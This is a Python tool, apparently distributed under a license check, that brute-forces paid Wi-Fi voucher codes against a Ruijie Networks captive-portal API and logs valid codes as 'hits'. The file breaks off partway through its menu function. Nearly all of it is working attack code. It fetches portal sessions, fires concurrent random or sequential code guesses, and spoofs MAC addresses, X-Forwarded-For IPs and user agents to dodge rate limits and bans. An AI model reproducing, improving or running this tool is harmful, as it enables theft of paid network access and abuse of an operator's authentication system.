# =====================================================================
# kavin_v8_fixed.py - KAVIN FAST SPEED V8 (Part 1 of 2) - HIT 100 VIEW
# =====================================================================

import os
import time
import random
import string
import json
import asyncio
import aiohttp
import urllib3
import socket
import threading
import requests
from urllib.parse import urlparse, parse_qs, quote
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.layout import Layout
from rich.table import Table
from rich.align import Align

try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY_LIMIT = 15
RL_SLEEP = 0.0
MAX_RL_SLEEP = 5.0

RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-A125F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

console = Console()
tried_codes = set()
code_lock = threading.Lock()
hits_lock = threading.Lock()
LICENSE_INFO = {"status": ""}
_portal_cache = {"url": None, "params": None}


def generate_random_mac():
    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))


def generate_random_ip():
    return f"192.168.110.{random.randint(2, 254)}"


def clear_screen():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except Exception:
        pass


def format_time(seconds):
    try:
        seconds = int(seconds)
        return f"{seconds // 3600:02d}:{(seconds % 3600) // 60:02d}:{seconds % 60:02d}"
    except Exception:
        return "00:00:00"


def check_license():
    if HAS_LICENSE_MODULE:
        try:
            return _license.check_approval()
        except Exception:
            pass
    return False, "No license module"


def activate_license(key):
    if HAS_LICENSE_MODULE:
        try:
            return _license.activate(key)
        except Exception as e:
            return False, f"Error: {e}"
    return False, "No license module"


def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        parts = ip.split('.')
        parts[-1] = '1'
        return '.'.join(parts)
    except Exception:
        return "192.168.110.1"


def extract_params_from_url(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    params = {}
    mapping = {
        'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address',
        'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num',
        'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url',
        'chap_id': 'chap_id', 'chap_challenge': 'chap_challenge'
    }
    for key, mk in mapping.items():
        if key in query:
            params[mk] = query[key][0]
    if 'RES' in query:
        params['RES'] = query['RES'][0]
    return params


def auto_detect_portal():
    if _portal_cache["url"]:
        return _portal_cache["url"]

    console.print(Panel(
        Align.center(Text("AUTO DETECTING PORTAL URL...", style="bold cyan")),
        border_style="cyan", box=ROUNDED
    ))

    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})

    TEST_URL = "https://connectivitycheck.gstatic.com/generate_204"
    try:
        r = session.get(TEST_URL, allow_redirects=True, timeout=5, verify=False)
        if "ruijienetworks" in r.url:
            console.print("[bold green][+][/bold green] Detected via Connectivity Check!")
            _portal_cache["url"] = r.url
            return r.url
    except Exception:
        pass

    console.print("[yellow][*][/yellow] Checking Gateways...")
    gateways = [get_gateway_ip(), "192.168.110.1", "192.168.0.1", "10.44.77.254", "192.168.1.1"]
    gateways = list(dict.fromkeys(gateways))

    for gw in gateways:
        try:
            res = session.get(f"http://{gw}", timeout=5, allow_redirects=True, verify=False)
            if "ruijienetworks" in res.url:
                console.print(f"[bold green][+][/bold green] Detected via Gateway ({gw})!")
                _portal_cache["url"] = res.url
                return res.url
        except Exception:
            pass
    return None


def load_hits_from_file():
    hits = []
    try:
        with open(HITS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if "CODE:" in line and "|" in line:
                    try:
                        left, right = line.split("|", 1)
                        code = left.split("CODE:")[1].strip()
                        plan = right.split("PLAN:")[1].strip() if "PLAN:" in right else "1HR"
                        time_str = ""
                        if line.startswith("[") and "]" in line:
                            time_str = line[1:line.index("]")]
                        hits.append({"code": code, "plan": plan, "time": time_str})
                    except Exception:
                        continue
    except FileNotFoundError:
        pass
    except Exception:
        pass
    return hits


async def fetch_official_session(session, gw_params, current_mac_ref, current_ip_ref):
    base = RUIJIE_WIFIDOG
    if "portal-mm-as" in str(gw_params.get("url", "")):
        base = base.replace("portal-as", "portal-mm-as")

    temp_params = dict(gw_params)
    temp_params['mac'] = current_mac_ref[0]
    temp_params['ip'] = current_ip_ref[0]

    params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
    full_url = f"{base}?{params_str}"

    headers = {
        'User-Agent': random.choice(USER_AGENTS),
        'Client-Mac': current_mac_ref[0],
        'X-Forwarded-For': current_ip_ref[0],
        'Connection': 'close'
    }

    try:
        session.cookie_jar.clear()
        async with session.get(full_url, headers=headers, timeout=5, allow_redirects=False) as resp:
            location = resp.headers.get('Location', '')

            if location:
                loc_lower = location.lower()
                if any(x in loc_lower for x in ["request limited", "error.html", "errormsg", "banned"]):
                    return "BAN", "Banned"

                q = parse_qs(urlparse(location).query)
                sid = q.get('sessionId', [None])[0]
                if sid:
                    return {
                        'sessionId': sid,
                        'sign': q.get('sign', [None])[0],
                        'timestamp': q.get('timestamp', [None])[0],
                    }, "REAL"
    except Exception:
        pass

    return None, "FAILED"


async def test_code_official(session, sess_data, code, mac, ip):
    url = RUIJIE_VOUCHER
    if sess_data.get('sign') and sess_data.get('timestamp'):
        url += f"&sign={sess_data['sign']}&timestamp={sess_data['timestamp']}"

    headers = {
        "content-type": "application/json",
        "user-agent": random.choice(USER_AGENTS),
        "referer": f"{RUIJIE_BASE}/download/static/maccauth/src/index.html?sessionId={sess_data['sessionId']}",
        "Client-Mac": mac,
        "X-Forwarded-For": ip,
    }

    payload = {
        "accessCode": code,
        "sessionId": sess_data['sessionId'],
        "apiVersion": 1,
    }
    if sess_data.get('sign'):
        payload["sign"] = sess_data['sign']
    if sess_data.get('timestamp'):
        payload["timestamp"] = sess_data['timestamp']

    try:
        async with session.post(url, json=payload, headers=headers, timeout=3, ssl=False, allow_redirects=True) as r:
            if r.status == 429:
                return "__RATE_LIMITED__", "1HR"

            text = await r.text()
            if not text:
                return "__NETWORK_ERROR__", "1HR"

            final_url = str(r.url).lower()
            low = text.lower()
            if ("request%20limited" in final_url or "request limited" in final_url
                    or "request limited" in low or "too many" in low):
                return "__RATE_LIMITED__", "1HR"

            if "session timed out" in low or "invalid session" in low:
                return "__SESSION_EXPIRED__", "1HR"

            plan = "1HR"
            if "2hr" in low or "2 hour" in low:
                plan = "2HR"
            elif "12hr" in low or "12 hour" in low:
                plan = "12HR"
            elif "24hr" in low or "1day" in low or "24 hour" in low:
                plan = "24HR"

            return text, plan
    except asyncio.TimeoutError:
        return "__TIMEOUT__", "1HR"
    except aiohttp.ClientError:
        return "__NETWORK_ERROR__", "1HR"
    except Exception as e:
        return f"__ERROR__:{type(e).__name__}", "1HR"


seq_counter = 0
seq_lock = threading.Lock()


def gen_code(mode, length, scan_method="random"):
    global seq_counter
    try:
        if scan_method == "sequential":
            with seq_lock:
                seq_counter += 1
                current = seq_counter
            if mode == "num":
                return str(current).zfill(length)
            elif mode == "eng":
                s, n = "", current
                for _ in range(length):
                    s = chr(ord('a') + (n % 26)) + s
                    n //= 26
                return s
            elif mode == "mix":
                chars = string.ascii_lowercase + string.digits
                s, n = "", current
                for _ in range(length):
                    s = chars[n % 36] + s
                    n //= 36
                return s
        else:
            if mode == "num":
                return str(random.randint(0, 10**length - 1)).zfill(length)
            elif mode == "eng":
                return ''.join(random.choices(string.ascii_lowercase, k=length))
            elif mode == "mix":
                return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    except Exception:
        pass
    return ""
# =====================================================================
# kavin_v8_fixed.py - KAVIN FAST SPEED V8 (Part 2 of 2) - HIT 100 VIEW
# =====================================================================

from rich.console import Console as _Console
_console_h = _Console()


def _get_terminal_rows():
    try:
        return _console_h.size.height or 30
    except Exception:
        return 30


def get_dashboard_renderable(mode, length, scan_method, current_code, tested,
                              elapsed, status, hits, speed, cur_mac, cur_ip,
                              tried_count, sess_stat, sess_id):
    layout = Layout()
    header_text = Text("⚡ KAVIN FAST SPEED V8 ⚡", style="bold bright_cyan", justify="center")

    # ===== HEADER (1 line) =====
    layout.split_column(
        Layout(Align.center(header_text), size=1),
        Layout(name="body", ratio=1)
    )

    # ===== SESSION STATUS =====
    sess_upper = sess_stat.upper()
    if sess_upper == "REAL":
        sess_text = f"✅ REAL ({sess_id[:6]}...)"
        sess_style = "bright_green"
    elif sess_upper in ("FAILED", "FAKE", "REFRESHING"):
        sess_text = "🔄 REFRESHING..."
        sess_style = "yellow"
    elif sess_upper in ("BANNED", "COOLDOWN"):
        sess_text = "🚫 COOLDOWN"
        sess_style = "red"
    elif sess_upper == "EXPIRED":
        sess_text = "⏰ EXPIRED"
        sess_style = "yellow"
    elif sess_upper.startswith("HIT"):
        sess_text = "🎯 HIT!"
        sess_style = "bright_green"
    else:
        sess_text = sess_stat
        sess_style = "cyan"

    status_upper = status.upper()
    if any(x in status_upper for x in ("ERR", "TIMEOUT", "BAN", "LIMIT", "EXPIRE", "FAIL")):
        status_style = "red"
    elif "HIT" in status_upper:
        status_style = "bright_green"
    else:
        status_style = "green"

    if scan_method == "sequential" and length > 0:
        if mode == "num":
            total_possible = 10**length
        elif mode == "eng":
            total_possible = 26**length
        else:
            total_possible = 36**length
        progress_pct = f"{(tried_count / total_possible * 100):.3f}%"
    else:
        progress_pct = "RND"

    # ===== COMPACT STATS BAR (2 lines ပဲ) =====
    line1 = Text()
    line1.append("🎯 ", style="bold")
    line1.append(f"{mode.upper()}-{length}", style="bold cyan")
    line1.append("  ⏱ ", style="bold")
    line1.append(f"{elapsed}", style="bold white")
    line1.append("  📊 ", style="bold")
    line1.append(f"{tested:,}", style="bold white")
    line1.append("  ⚡ ", style="bold")
    line1.append(f"{int(speed)} c/m", style="bold white")
    line1.append("  🔑 ", style="bold")
    line1.append(f"{len(hits)}", style="bold bright_green")

    line2 = Text()
    line2.append("📡 Status: ", style="bold")
    line2.append(f"{status.upper()}", style=f"bold {status_style}")
    line2.append("  🔐 ", style="bold")
    line2.append(sess_text, style=f"bold {sess_style}")
    line2.append("  📈 ", style="bold")
    line2.append(progress_pct, style="bold white")
    line2.append("  🖥 ", style="bold")
    line2.append(f"...{cur_mac[-8:]}", style="dim")

    stats_text = Text("\n").join([line1, line2])
    stats_panel = Panel(stats_text, border_style="magenta", box=ROUNDED, height=4)

    # ===== CURRENT CODE (1 line) =====
    check_text = Text()
    check_text.append("🎫 Checking  ➜  ", style="bold yellow")
    check_text.append(current_code if current_code else "------", style="bold bright_yellow")
    check_panel = Panel(Align.center(check_text), border_style="yellow", box=ROUNDED, height=3)

    # ===== HITS TABLE (terminal ဆံ့သလောက် - အများဆုံး) =====
    term_h = _get_terminal_rows()
    # header(1) + stats(4) + check(3) + footer(1) + borders(~3) = 12
    reserved = 12
    available_rows = max(term_h - reserved, 5)

    v_table = Table(
        show_header=True, header_style="bold bright_white",
        expand=True, box=ROUNDED, border_style="green",
        padding=(0, 0), show_edge=True
    )
    v_table.add_column("🎫 Voucher Code", style="bold green", justify="center", no_wrap=True)
    v_table.add_column("⏳ Plan", style="bold cyan", justify="center", width=7)
    v_table.add_column("🕐 Time", style="dim white", justify="center", width=10)

    # အသစ်ဆုံးက အပေါ်မှာ
    display_hits = list(reversed(hits))
    hidden_count = 0

    if len(display_hits) > available_rows:
        hidden_count = len(display_hits) - available_rows
        display_hits = display_hits[:available_rows]

    for h in display_hits:
        code_str = h.get('code', '')
        plan_str = h.get('plan', '1HR')
        time_str = h.get('time', '')
        if " " in time_str:
            time_str = time_str.split(" ")[-1]
        v_table.add_row(code_str, plan_str, time_str)

    if not hits:
        v_table.add_row("No hits yet...", "", "", style="dim")

    subtitle = f"[dim]Showing {len(display_hits)}/{len(hits)}"
    if hidden_count > 0:
        subtitle += f" • {hidden_count} in hits.txt"
    subtitle += f" • Terminal rows: {term_h}[/dim]"

    hits_panel = Panel(
        v_table,
        title=f"[bold bright_green]🎯 VOUCHER HITS  ({len(hits)} total)[/bold bright_green]",
        subtitle=subtitle,
        border_style="green",
        box=ROUNDED
    )

    # ===== FOOTER (1 line) =====
    footer_text = Text("👑 @kavin799 👑", style="bold bright_cyan", justify="center")

    # ===== LAYOUT =====
    body_layout = Layout()
    body_layout.split_column(
        Layout(stats_panel, size=4),
        Layout(check_panel, size=3),
        Layout(hits_panel, ratio=1),
        Layout(Align.center(footer_text), size=1)
    )
    layout["body"].update(body_layout)
    return layout


async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
    global seq_counter, tried_codes, RL_SLEEP
    tried_codes = set()
    seq_counter = 0
    RL_SLEEP = 0.0

    if not gw_params:
        gw_params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.2",
            "mac": "", "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245",
            "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    mode_str = f"{mode}_{length}"
    hits, tested, start_time = load_hits_from_file(), 0, time.time()

    current_code = [""]
    current_status = ["Init"]
    sess_stat = ["REFRESHING"]
    sess_id = ["--------"]

    current_mac = [generate_random_mac()]
    current_ip = [generate_random_ip()]
    sess_data = [None]

    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)

    conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
    async with aiohttp.ClientSession(connector=conn_limit) as session:
        live = Live(
            get_dashboard_renderable(
                mode_str, length, scan_method, "", tested, "00:00:00",
                "Init", hits, 0.0, current_mac[0], current_ip[0], 0,
                sess_stat[0], sess_id[0]
            ),
            refresh_per_second=2, screen=True, transient=False
        )

        live_started = False
        try:
            live.start()
            live_started = True

            while True:
                # ---- Session refresh ----
                if sess_data[0] is None:
                    current_status[0] = "Refreshing Session..."
                    res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)

                    if res is None or err_msg == "FAILED":
                        current_mac[0] = generate_random_mac()
                        current_ip[0] = generate_random_ip()
                        sess_stat[0] = "REFRESHING"
                        sess_id[0] = "--------"
                        current_status[0] = "Retrying Session..."
                        await asyncio.sleep(0.2)
                        continue

                    if res == "BAN":
                        sess_stat[0] = "BANNED"
                        sess_id[0] = "--------"
                        current_status[0] = "Cooldown..."
                        await asyncio.sleep(1.0)
                        current_mac[0] = generate_random_mac()
                        current_ip[0] = generate_random_ip()
                        continue

                    sess_data[0] = res
                    sess_stat[0] = err_msg
                    sess_id[0] = res.get('sessionId', '--------')
                    current_status[0] = "Scanning..."

                # ---- Generate batch ----
                batch_codes = []
                max_attempts = CONCURRENCY_LIMIT * 10
                attempts = 0
                while len(batch_codes) < CONCURRENCY_LIMIT and attempts < max_attempts:
                    attempts += 1
                    c = gen_code(mode, length, scan_method)
                    if not c:
                        continue
                    if scan_method == "sequential":
                        batch_codes.append(c)
                    else:
                        with code_lock:
                            if c in tried_codes:
                                continue
                            tried_codes.add(c)
                        batch_codes.append(c)

                if not batch_codes:
                    await asyncio.sleep(0.01)
                    continue

                async def bounded_check(code):
                    async with semaphore:
                        return await test_code_official(
                            session, sess_data[0], code, current_mac[0], current_ip[0]
                        )

                tasks = [bounded_check(code) for code in batch_codes]
                results = await asyncio.gather(*tasks, return_exceptions=True)

                tested += len(batch_codes)

                hit_found_in_batch = False
                session_expired_in_batch = False

                for idx, res_tuple in enumerate(results):
                    code = batch_codes[idx]
                    current_code[0] = code

                    if isinstance(res_tuple, Exception):
                        continue
                    res, plan = res_tuple

                    if res == "__SESSION_EXPIRED__":
                        sess_data[0] = None
                        sess_stat[0] = "EXPIRED"
                        current_status[0] = "Session Expired"
                        session_expired_in_batch = True
                        break

                    if res == "__RATE_LIMITED__":
                        sess_data[0] = None
                        sess_stat[0] = "BANNED"
                        current_status[0] = "Rate Limited"
                        hit_found_in_batch = True
                        RL_SLEEP = min(RL_SLEEP + 0.5, MAX_RL_SLEEP)
                        await asyncio.sleep(RL_SLEEP)
                        current_mac[0] = generate_random_mac()
                        current_ip[0] = generate_random_ip()
                        break

                    if res.startswith("__ERROR__:") or res in ("__TIMEOUT__", "__NETWORK_ERROR__"):
                        continue

                    low = res.lower()
                    if "request limited" in low or "blocked" in low or "too many" in low:
                        sess_data[0] = None
                        sess_stat[0] = "BANNED"
                        current_status[0] = "Rate Limited"
                        hit_found_in_batch = True
                        RL_SLEEP = min(RL_SLEEP + 0.5, MAX_RL_SLEEP)
                        await asyncio.sleep(RL_SLEEP)
                        current_mac[0] = generate_random_mac()
                        current_ip[0] = generate_random_ip()
                        break

                    # Detect hit
                    is_hit = False
                    try:
                        j = json.loads(res)
                        if j.get("success") is True and isinstance(j.get("result"), dict):
                            if j["result"].get("logonUrl"):
                                is_hit = True
                    except Exception:
                        if ('"success":true' in low or '"authresult":"1"' in low
                                or "congratulations" in low):
                            is_hit = True

                    if is_hit:
                        RL_SLEEP = max(RL_SLEEP - 0.5, 0.0)
                        now_str = time.strftime("%Y-%m-%d %H:%M:%S")
                        with hits_lock:
                            hits.append({"code": code, "time": now_str, "plan": plan})
                            try:
                                with open(HITS_FILE, "a", encoding="utf-8") as f:
                                    f.write(f"[{now_str}] CODE: {code} | PLAN: {plan}\n")
                            except Exception:
                                pass

                        sess_data[0] = None
                        current_mac[0] = generate_random_mac()
                        current_ip[0] = generate_random_ip()
                        sess_stat[0] = "HIT (Refreshing)"
                        current_status[0] = "HIT FOUND!"
                        hit_found_in_batch = True
                        break

                elapsed = time.time() - start_time
                speed = (tested / elapsed * 60) if elapsed > 0 else 0.0

                live.update(get_dashboard_renderable(
                    mode_str, length, scan_method, current_code[0], tested,
                    format_time(elapsed), current_status[0], hits, speed,
                    current_mac[0], current_ip[0], tested,
                    sess_stat[0], sess_id[0]
                ))

                if hit_found_in_batch:
                    await asyncio.sleep(0.1)
                if session_expired_in_batch:
                    await asyncio.sleep(0.01)

        except (KeyboardInterrupt, asyncio.CancelledError):
            if live_started:
                try:
                    live.stop()
                except Exception:
                    pass
            console.print("\n[bold yellow]⏹ Interrupted by user[/bold yellow]")
        except Exception as e:
            if live_started:
                try:
                    live.stop()
                except Exception:
                    pass
            console.print(f"\n[bold red]Fatal Error: {e}[/bold red]")
        finally:
            if live_started:
                try:
                    live.stop()
                except Exception:
                    pass

            # ===== FINAL HIT SUMMARY (Hit အားလုံး အပြည့်အစုံ ပြ) =====
            if hits:
                console.print("\n")
                console.print(Panel(
                    Align.center(Text(f"🎯 FINAL HITS: {len(hits)}", style="bold bright_green")),
                    border_style="bright_green", box=ROUNDED
                ))

                summary_table = Table(
                    show_header=True, header_style="bold bright_white",
                    box=ROUNDED, border_style="green", expand=True
                )
                summary_table.add_column("#", justify="right", style="dim", width=5)
                summary_table.add_column("Voucher Code", style="bold green", justify="center")
                summary_table.add_column("Plan", style="bold cyan", justify="center", width=8)
                summary_table.add_column("Time", style="dim white", justify="center", width=12)

                for i, h in enumerate(hits, 1):
                    t = h.get('time', '')
                    if " " in t:
                        t = t.split(" ")[-1]
                    summary_table.add_row(str(i), h.get('code', ''), h.get('plan', '1HR'), t)

                console.print(summary_table)
                console.print()


def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED V8 ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()


def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet Mode")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0":
            return None
        if choice not in ("1", "2", "3"):
            continue
        return {"1": "num", "2": "eng", "3": "mix"}[choice]


def ask_length(mode):
    while True:
        show_banner()
        console.print("  [bold bright_white]Choose Voucher Length:[/bold bright_white]\n")
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] ⚡ 6 Characters")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] ⚡ 7 Characters")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] ⚡ 8 Characters")
        console.print("  [bold bright_cyan]4.[/bold bright_cyan] ⚡ 9 Characters")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0":
            return None
        if choice not in ("1", "2", "3", "4"):
            continue
        return {"1": 6, "2": 7, "3": 8, "4": 9}[choice]


def ask_scan_method():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random Mode")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential Mode")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        choice = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if choice == "0":
            return None
        if choice not in ("1", "2"):
            continue
        return {"1": "random", "2": "sequential"}[choice]


def run():
    show_banner()
    portal_url = auto_detect_portal()

    gw_params = None
    if portal_url:
        extracted = extract_params_from_url(portal_url)
        console.print("[bold green][+][/bold green] URL fetched successfully!")
        time.sleep(1)

        gw_params = {
            "stage": "portal",
            "gw_id": extracted.get("gw_id", "c4b25be7d323"),
            "gw_sn": extracted.get("gw_sn", "H1U320P00210A"),
            "gw_address": extracted.get("gw_address", "192.168.7.1"),
            "gw_port": extracted.get("gw_port", "2060"),
            "ip": generate_random_ip(),
            "mac": "",
            "slot_num": extracted.get("slot_num", "14"),
            "nasip": extracted.get("nasip", "192.168.1.193"),
            "ssid": extracted.get("ssid", "VLAN7"),
            "ustate": "0", "mac_req": "1",
            "url": extracted.get("url", "http://connectivitycheck.gstatic.com/generate_204"),
            "chap_id": extracted.get("chap_id", r"\245"),
            "chap_challenge": extracted.get(
                "chap_challenge",
                r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
            )
        }
    else:
        console.print("[bold red][-][/bold red] Auto-detect failed. Using default gateway params.")
        time.sleep(1.5)

    while True:
        mode = ask_mode()
        if mode is None:
            return
        length = ask_length(mode)
        if length is None:
            continue
        scan_method = ask_scan_method()
        if scan_method is None:
            continue

       